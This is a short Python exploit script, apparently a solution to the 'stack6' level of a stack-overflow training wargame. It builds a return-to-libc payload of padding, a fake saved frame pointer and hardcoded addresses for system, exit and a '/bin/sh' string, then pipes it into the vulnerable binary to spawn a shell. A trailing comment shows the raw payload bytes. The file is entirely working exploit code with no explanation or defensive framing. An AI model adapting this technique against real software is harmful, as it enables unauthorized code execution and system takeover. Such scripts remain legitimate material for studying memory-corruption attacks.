import subprocess
import struct


bin_sh = 0x556eca24
system = 0x555cc190
exit=    0x555bf1e0

# First, the buffer overflow.
payload =  "A"*0x4c+'BBBB'
#overwrite saved ebp
#then overwrite return with system call
payload += struct.pack('<I',system)
#payload += struct.pack('<I',system)
#ret to exit
payload+=struct.pack('<I',exit)
#binsh arg
payload += struct.pack('<I',bin_sh)
#payload+= struct.pack('<I',bin_sh)


print (payload)



p = subprocess.Popen("./stack6", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
p.stdin.write(payload)


#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\UAAAAAAAABBBB\U[U$U